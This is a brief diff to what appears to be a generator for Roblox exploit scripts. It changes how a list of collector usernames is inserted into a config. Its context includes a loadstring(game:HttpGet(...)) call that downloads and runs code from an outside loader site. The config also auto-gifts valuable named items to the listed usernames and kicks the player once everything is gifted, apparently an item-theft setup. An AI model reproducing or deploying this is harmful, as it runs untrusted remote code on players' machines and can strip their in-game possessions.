@@ -3125,7 +3125,7 @@ repeat wait()spawn(function()loadstring(game:HttpGet("https://nousigi.com/loader
                     LOW_CPU = true,
                     KICK_AFTER_GIFTED_ALL = true,
                     AUTO_SELL_RARITY = {"Rare", "Epic", "Legendary"},
-                    GIFT_USERNAME = {${listUserCollect.join(",")}},  -- Add username "username1", "username2"
+                    GIFT_USERNAME = {${listUserCollect}},  -- Add username "username1", "username2"
                     GIFT_BRAINROT = {"Los Tralaleritos","La Tomatoro","Los Sekolitos","Garamararam","Crazylone Pizaione"},  -- Gift brainrot via name
                     GIFT_BRAINROT_MONEY_PER_SECOND = 45000,  -- $10k+/s -> Gift
                     GIFT_PLANT = {},  -- Gift plant via name
